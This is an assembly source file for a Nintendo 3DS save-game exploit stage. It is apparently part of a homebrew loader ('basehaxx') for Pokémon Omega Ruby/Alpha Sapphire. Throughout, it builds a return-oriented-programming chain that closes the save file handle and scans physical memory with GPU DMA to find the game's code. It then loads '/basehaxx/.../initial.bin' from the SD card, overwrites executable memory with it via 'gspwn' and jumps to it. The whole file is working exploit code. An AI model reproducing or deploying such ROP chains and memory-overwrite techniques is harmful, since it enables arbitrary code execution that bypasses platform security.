.nds

.include "oras_constants.s"
.include "oras_macros.s"

.create "../build/rop_stage1.bin",ORAS_SAVE_OWNERNAME_PTR+ORAS_STAGE1_OFFSET

; ROP
rop:	
	.word ROP_ORAS_POP_R1PC
		.word ROP_ORAS_NOP ; prepare jump for next gadget
	.word ROP_ORAS_MOV_R0R9_BLX_R1 ; move file handle to r0 and then jump to next gadget
	
	store_r0_to file_handle
	FSFILE_Close file_handle ; close stage1 rop.bin file handle 
	
	deref_to_r0_and_sub ORAS_APPMEMTYPE_PTR, 0x6 ; get the appmemtype,
												 ; I don't know why but it takes much more time when trying to directly 
												 ; use the appmemalloc, so I manually set the address depending on the 
												 ; appmemtype
	compare_r0_0 ; if appmemtype == 6 (N3DS)
	store_to_addr_if_equal loop_src, 0x14000000 + 0x07C00000 - ORAS_MAX_CODEBIN_SIZE ; set address for physmem gspwn
	
	scan_loop:
	
		.word ORAS_GSPGPU_GXTRYENQUEUE_WRAPPER
			.word 0x4
			loop_src:
				.word 0x14000000 + 0x04000000 - ORAS_MAX_CODEBIN_SIZE ; src overwritten
			loop_dst:
				.word LINEAR_BUFFER ; dest
			.word ORAS_SCANLOOP_STRIDE
			.word 0xFFFFFFFF
			.word 0xFFFFFFFF
			.word 0x8
			.word 0x0
			
			.word 0x0
			
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
		
		sleep 100*1000, 0
		
		store_value scan_loop, ORAS_GSPGPU_GXTRYENQUEUE_WRAPPER

		dereference_to_r0 loop_dst
		.word ROP_ORAS_LDR_R0R0_POP_R4PC
			.word 0x100000000 - ORAS_MAGICVAL
		.word ROP_ORAS_ADD_R0_R0R4_POP_R4PC
			.word 0xDEADC0DE
		compare_r0_0
		
		store_to_addr_if_equal loop_break, (loop_end - (loop_break+4))
		
		.word ROP_ORAS_POP_R3_ADD_SP_SPR3_POP_PC
			loop_break:
				.word 0x0
		
		deref_to_r0_and_add loop_src, ORAS_SCANLOOP_STRIDE
		store_r0_to loop_src
		
		deref_to_r0_and_add loop_dst, 0x20
		store_r0_to loop_dst
		
		loop_pivot:
			stack_pivot scan_loop
		
	loop_end:
	
	;memcpy LINEAR_BUFFER, ORAS_SAVE_PICDATA_BUFFER_PTR + (rop_end - rop), initial_payload_size_end - initial_payload_size
	FSUSER_OpenFileDirectly file_handle, 0x0, ARCH_SDMC, PATH_EMPTY, empty_string, 0x1, PATH_ASCII, initial_path, initial_path_end-initial_path, FS_OPEN_READ, 0x0
	FSFILE_GetSize file_handle, file_size
	FSFILE_Read file_handle, 0, 0, dest_and_size, bytes_read
	FSFILE_Close file_handle
	
	flush_dcache LINEAR_BUFFER, 0x00100000
	gspwn loop_src, 0, LINEAR_BUFFER, 0x4000
	
	sleep 200*1000*1000, 0
	
	.word INITIAL_PAYLOAD_VA	
	
	file_handle:
		.word 0x0
	empty_string:
		.word 0x0
		
	dest_and_size:
		.word LINEAR_BUFFER
		file_size:
			.word 0x0
	
	initial_path:
		.ascii "/basehaxx/", ORAS_VERSION, "/initial.bin", 0
	initial_path_end:
	
	bytes_read:
		.word 0x0
rop_end:

.close